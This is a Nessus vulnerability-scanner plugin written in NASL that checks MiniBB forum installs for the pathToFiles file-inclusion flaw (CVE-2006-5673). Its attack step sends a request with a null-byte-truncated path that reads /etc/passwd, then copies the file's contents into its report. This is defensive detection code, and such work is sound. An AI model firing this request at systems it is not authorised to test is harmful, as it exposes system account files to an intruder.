#
#       This script was written by Justin Seitz <jms@bughunter.ca>
#	Per Justin : GPLv2
#

# Changes by Tenable:
# - Revised plugin title (3/15/10)

include("compat.inc");

if(description)
{
 # set script identifiers

 script_id(22926);
 script_version("$Revision: 1.20 $");

 script_cve_id("CVE-2006-5673");
 script_bugtraq_id(20757);
 script_osvdb_id(29971);
 script_xref(name:"EDB-ID", value:"2655");

 script_name(english:"miniBB bb_func_txt.php pathToFiles Parameter Remote File Inclusion");
 script_summary(english:"Tries to read a local file with MiniBB");
 script_family(english:"CGI abuses");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote web server is running MiniBB, an open source forum
software. 

The version of MiniBB installed on the remote host fails to sanitize
input to the 'pathToFiles' parameter before using it in the
'bb_func_txt.php' script. 

Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit this issue to view arbitrary
files and execute arbitrary code, possibly taken from third-party
hosts, on the remote host." );
 script_set_attribute(attribute:"solution", value:
"Update to version 2.0.2a or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/10/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/10/26");
 script_cvs_date("$Date: 2011/03/15 19:22:15 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2006-2011 Justin Seitz");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);

 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if(!can_host_php(port:port)) exit(0);

#
# create list of directories to scan
#


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/minibb","/mini","/blog","/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

#
# Iterate through the list
#

file = "/etc/passwd";

foreach dir (dirs) {

#
#
#       Attack: Attempt a remote file include of /etc/passwd
#
#
  attackreq = http_get(item:string(dir, "/bb_func_txt.php?pathToFiles=", file, "%00"),port:port);
  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);

  if (attackres == NULL) exit(0);

  if (dir == "") dir = "/";

  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
    string("main(", file, "\\0bb_codes.php): failed to open stream") >< attackres ||
    string("main(", file, "): failed to open stream: No such file") >< attackres ||
    "open_basedir restriction in effect. File(" >< attackres)   {

    passwd = "";
    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))     {
      passwd = attackres;
      if ("<br" >< passwd) passwd = passwd - strstr(passwd, "<br");
    }

    if (passwd) {
      report = string("\n", "The version of MiniBB installed in directory '", dir, "'\n",
        "is vulnerable to this issue. Here is the contents of /etc/passwd\n",
        "from the remote host :\n\n", passwd);
      security_warning(port:port, extra:report);
    }
    exit(0);
  }
}
